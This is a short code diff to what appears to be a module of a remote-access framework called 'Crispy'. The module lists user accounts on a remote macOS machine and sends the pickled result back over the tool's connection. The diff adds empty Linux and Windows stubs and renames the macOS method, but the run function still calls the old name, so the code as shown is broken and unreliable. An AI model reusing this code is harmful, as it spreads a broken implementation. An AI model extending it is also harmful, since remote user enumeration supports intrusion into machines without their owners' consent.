@@ -11,14 +11,14 @@ __class_name__ = "UsersModule"
 class UsersModule(CrispyModule):
     """ Enum users on a remote machine. """
 
-    # can be: 'darwin', 'nt', 'android'
+    # can be: 'darwin', 'linux', 'windows', 'android'
     compatible_systems = ['darwin']
     
     #def init_argparse(self):
     #    self.parser = CrispyArgumentParser(prog="apps", description=self.__doc__)
     #    #self.parser.add_argument()
 
-    def marshall_me(self):
+    def marshall_darwin(self):
         import os 
        
         ignore = ['.localized', 'Guest', 'Shared']
@@ -29,12 +29,24 @@ class UsersModule(CrispyModule):
                 info += "{}\n".format(user)
         return info
 
+    def marshall_linux(self):
+        pass
+
+    def marshall_windows(self):
+        pass
+
     def run(self, args):
         logger.debug("in users run()")
         info("Getting system users now...")
+        
         if (self.is_compatible()):
             try:
-                data = cPickle.dumps(self.marshall_me(), -1)
+                if self.client.is_darwin():
+                    data = cPickle.dumps(self.marshall_me(), -1)
+                if self.client.is_linux():
+                    pass
+                if self.client.is_windows():
+                    pass
                 self.client.conn.sendall(data)
                 print self.client.conn.recv(1024)
                 success("Done.")
